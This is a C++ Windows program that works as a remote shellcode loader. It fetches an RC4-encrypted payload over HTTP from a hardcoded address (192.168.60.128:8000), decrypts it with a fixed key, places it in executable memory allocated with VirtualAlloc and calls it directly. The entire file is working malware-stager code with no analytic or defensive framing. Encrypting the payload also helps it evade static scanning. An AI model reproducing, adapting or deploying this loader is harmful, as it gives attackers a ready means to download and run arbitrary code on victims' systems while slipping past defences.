#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <cstring>

#pragma comment(lib, "wininet.lib")

void RC4Decrypt(std::vector<char>& data, const std::string& key) {
    int keylen = key.size();
    unsigned char s[256];
    for (int i = 0; i < 256; ++i)
        s[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); ++n) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

std::vector<char> LoadRemoteShellcode(const char* url) {
    std::vector<char> buffer;
    HINTERNET hInternet = InternetOpenA("ShellcodeLoader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "Failed to open internet." << std::endl;
        return buffer;
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        std::cerr << "Failed to connect to URL." << std::endl;
        InternetCloseHandle(hInternet);
        return buffer;
    }

    char temp[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, temp, sizeof(temp), &bytesRead) && bytesRead) {
        buffer.insert(buffer.end(), temp, temp + bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

void LoadShellcode(const char* url) {
    // Load encrypted shellcode from URL
    std::vector<char> buffer = LoadRemoteShellcode(url);
    if (buffer.empty()) {
        std::cerr << "Failed to load shellcode from URL." << std::endl;
        return;
    }

    // Decrypt the shellcode
    std::string key = "advapi32.dll";
    RC4Decrypt(buffer, key);

    // Allocate executable memory
    void* exec = VirtualAlloc(nullptr, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == nullptr) {
        std::cerr << "Failed to allocate executable memory." << std::endl;
        return;
    }

    // Copy shellcode to executable memory
    std::memcpy(exec, buffer.data(), buffer.size());

    // Allocated memory to a function pointer
    void (*func)() = (void(*)())exec;

    // Call the shellcode
    func();

    // Free the allocated memory
    VirtualFree(exec, 0, MEM_RELEASE);
}

int main() {
    const char* url = "http://192.168.60.128:8000/shokecare.bin.enc";
    LoadShellcode(url);
    return 0;
}

